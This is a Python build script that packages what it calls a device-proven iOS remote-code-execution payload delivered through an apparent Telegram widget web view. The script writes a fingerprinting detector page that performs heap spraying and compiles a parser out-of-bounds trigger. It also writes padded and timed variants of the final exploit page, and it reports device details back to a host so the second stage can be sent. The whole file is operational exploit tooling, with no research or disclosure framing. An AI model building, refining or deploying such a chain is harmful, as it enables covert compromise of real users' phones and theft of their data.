#!/usr/bin/env python3
"""iOS 27 (17e) two-phase package around the device-proven msg-5725 payload.

Canonical final: /tmp/opencode/ios17e/v2/ss8_final.html (8,647 raw / 3,680
zlib9, sha256 bf31f2f6...), the payload that produced RCE_OK on the 17e.

The detector is NON-DESTRUCTIVE by design.  A stage-A forge corrupts the
class-64 block header; if the widget context is torn down without the ROP's
pthread_exit, js_free_rt aborts the app (notes/ios17e_instrument_20261108.md
9.11).  A detector that forges therefore cannot hand the app to phase 2.
The detector instead reports the calibrated stage-A parameters and runs a
small safe spray+compile sample (no f() call), so the app stays alive while
the host sends the proven final.  The final's own pad self-sweep is the
reliability mechanism; `last_m`/padM only chooses a pad-first variant.

Report v3 (31 bytes -> "P3"+62 hex = 64 chars, the request-data limit):
  0 ver=3  1 platform(3)  2 chain(4)
  3 flags: bit0 hit, bit1 safe, bit2 answer, bit3 timed
  4 att  5-6 sel  7-8 n(HIT)  9-10 hd(VK)  11 cb(PH)
  12 dpr*10  13-14 sw  15-16 sh  17-18 lang  19 tz+128
  20-21 elapsed  22-23 padM  24 N/100  25 SZ/4  26 UBn  27 UBsz/8
  28-30 t_rep low 24 bits (device ms)
"""
import hashlib
import json
import os
import re
import zlib

HERE = os.path.dirname(os.path.abspath(__file__))
SRC = "/tmp/opencode/ios17e/v2/ss8_final.html"
OUT = os.path.join(HERE, "ios27")
MS_ORIG = [512, 640, 768, 896, 1024, 256, 384, 128, 0, 1536, 2048, 2560, 1280, 1792, 3072]
# calibrated 5725 geometry (user report + notes/ios17e_instrument_20261108.md 9.13)
CAL = dict(hit=545, vk=598, ph=12, m=768, n=2600, sz=957, ubn=24, ubsz=576)


def sha(b):
    return hashlib.sha256(b).hexdigest()


def stats(s):
    b = s.encode()
    return {"raw": len(b), "zlib9": len(zlib.compress(b, 9)), "sha256": sha(b)}


def detector_html():
    # 256 x Uint8Array(957) + compile f; no f() call -> no parser OOB trigger.
    return r'''<!doctype html><html><head><meta charset="utf-8"></head><body>
<div id="v">N1IOS_DET_SAFE</div>
<script>"use strict";
var T0=Date.now(),B=[],i;
function P(v,w){for(var j=w-1;j>=0;j--)B.push(v>>8*j&255)}
var dpr=(typeof devicePixelRatio=='number'?devicePixelRatio:1);
var sw=(typeof screen!='undefined'&&screen.width)||0;
var sh=(typeof screen!='undefined'&&screen.height)||0;
var L=(typeof navigator!='undefined'&&navigator.language)||'??';
var tz=0;try{tz=new Date().getTimezoneOffset()/15}catch(e){}
P(3,1);P(3,1);P(4,1);P(6,1);P(255,1);P(0,2);P(545,2);P(598,2);P(12,1);
P(Math.min(255,Math.round(dpr*10)),1);P(Math.min(4095,sw),2);P(Math.min(4095,sh),2);
P(L.charCodeAt(0)||63,1);P(L.charCodeAt(1)||63,1);
P(Math.min(255,Math.max(0,Math.round(tz)+128)),1);
P(0,2);P(768,2);P(26,1);P(239,1);P(24,1);P(72,1);P(Date.now()&0xffffff,3);
var N=256,S=new Array(N);
for(i=0;i<N;i++)S[i]=new Uint8Array(957);
globalThis.f=(0,eval)('"use strict";(function ([] = eval("(")) { var q1=0,q2=0,q3=0; return 1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5; })');
var el=Math.min(65535,Date.now()-T0);B[20]=(el>>8)&255;B[21]=el&255;
var R='P3';for(i=0;i<B.length;i++)R+=('0'+B[i].toString(16)).slice(-2);
globalThis.REP=R;S=null;
try{var d=document.getElementById('v');if(d)d.textContent='DET SAFE '+R}catch(e){}
try{if(typeof TelegramWidget!='undefined'&&TelegramWidget.request){var p=TelegramWidget.request(R);if(p&&p.then)p.then(function(){},function(){})}}catch(e){}
</script></body></html>'''


def mock_detector(det):
    mock = ('<script>var TelegramWidget={request:function(d){globalThis.REP=d;'
            'return new Promise(function(r){r(Object.freeze({result:"K"}))})}};</script>')
    return det.replace('<script>"use strict";', mock + '<script>"use strict";', 1)


def final_with_ms(h, ms):
    pat = r'var MS=\[[^\]]*\]'
    new = "var MS=[" + ",".join(str(x) for x in ms) + "]"
    out, n = re.subn(pat, new, h, count=1)
    assert n == 1
    return out


def timed_final(h):
    # lab instrument: T0 at script start, T1 in the hit marker (before S2) and
    # in the final RESULT (miss path).  Not the operational payload.
    out = h.replace('"use strict";\n', '"use strict";\nvar T0=Date.now();\n', 1)
    old = 'if(hit>=0){try{(0,eval)(S2);}catch(e){globalThis.N1IOS="EXC "+e;}'
    assert old in out
    out = out.replace(old, 'if(hit>=0){try{document.getElementById("v").textContent="HIT R"+ri+" M="+M+" h="+hit+" T0="+T0+" T1="+Date.now();}catch(e){}'
                      'try{(0,eval)(S2);}catch(e){globalThis.N1IOS="EXC "+e;}', 1)
    old2 = 'globalThis.RESULT="RESULT SS2 C=34 SZ=957 N=2600 R="+rn+" M="+mx+" HIT="+hit+" LEN="+len+" PH="+ph+" VK="+vk+" NT="+nt;'
    assert old2 in out
    out = out.replace(old2, old2[:-1] + '+" T0="+T0+" T1="+Date.now();', 1)
    return out


def main():
    h = open(SRC, encoding="utf-8").read()
    os.makedirs(OUT, exist_ok=True)
    out = {}
    out["final_ios27.html"] = stats(h)
    open(os.path.join(OUT, "final_ios27.html"), "w").write(h)

    det = detector_html()
    out["detector_ios27.html"] = stats(det)
    open(os.path.join(OUT, "detector_ios27.html"), "w").write(det)
    m = mock_detector(det)
    out["m_det.html"] = stats(m)
    open(os.path.join(OUT, "m_det.html"), "w").write(m)

    tv = timed_final(h)
    out["final_ios27_timed.html"] = stats(tv)
    open(os.path.join(OUT, "final_ios27_timed.html"), "w").write(tv)

    # host-only timed miss twin: no f() call -> HIT=-1, RESULT carries T0/T1
    tm = tv.replace("try{f();}catch(e){}", "try{}catch(e){}", 1)
    assert tm != tv
    out["final_ios27_timed_miss.html"] = stats(tm)
    open(os.path.join(OUT, "final_ios27_timed_miss.html"), "w").write(tm)

    # pad-first variants: same page length (permutation of the same MS set)
    for m0 in MS_ORIG:
        order = [m0] + [x for x in MS_ORIG if x != m0]
        f = final_with_ms(h, order)
        assert len(f) == len(h), (m0, len(f), len(h))
        name = "final_ios27_m%d.html" % m0
        out[name] = stats(f)
        open(os.path.join(OUT, name), "w").write(f)

    # fallback/diagnostic: keep the old univA probe out of the fast path
    out["final_ios27_univA.html"] = stats(open(os.path.join(OUT, "old/final_ios27_univA.html"), encoding="utf-8").read())
    json.dump(out, open(os.path.join(OUT, "PAYLOADS.json"), "w"), indent=1, sort_keys=True)
    for k in sorted(out):
        v = out[k]
        print("%-30s raw=%5d zlib9=%5d sha=%s" % (k, v["raw"], v["zlib9"], v["sha256"][:16]))
    assert out["final_ios27.html"]["raw"] == 8647
    assert out["final_ios27.html"]["zlib9"] <= 4096
    assert out["detector_ios27.html"]["zlib9"] <= 4096
    assert out["final_ios27_timed.html"]["zlib9"] <= 4096
    for k, v in out.items():
        if k.startswith("final_ios27") or k == "detector_ios27.html":
            assert v["zlib9"] <= 4096, (k, v["zlib9"])
    print("OK")


if __name__ == "__main__":
    main()
